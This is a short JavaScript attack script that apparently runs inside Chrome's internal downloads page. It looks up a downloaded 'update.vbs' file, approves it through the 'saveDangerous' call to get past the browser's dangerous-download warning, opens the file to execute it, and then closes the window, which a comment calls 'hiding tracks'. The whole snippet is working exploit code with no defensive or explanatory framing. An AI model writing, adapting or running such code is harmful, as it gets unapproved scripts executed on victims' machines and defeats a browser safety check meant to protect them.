'use strict';
(() => {
const window = top;
const chrome = window.chrome;
const myQuery = 'update.vbs';
let myDownload;
window.downloads.Manager.insertItems = (index, list) => {
    if (!myDownload) {
        myDownload = list.find(download => download.url.includes(myQuery));
        useMyDownload(myDownload);
    }

};
chrome.send('getDownloads', [myQuery]);
function useMyDownload(downloadItem) {
    console.log(downloadItem);
    chrome.send('saveDangerous', [downloadItem.id]);
    // download timeout
    setTimeout(() => {
        chrome.send('openFile', [downloadItem.id]);
        // hiding tracks - closing the download window
        window.setTimeout(window.close);
    }, 1);
}

})();
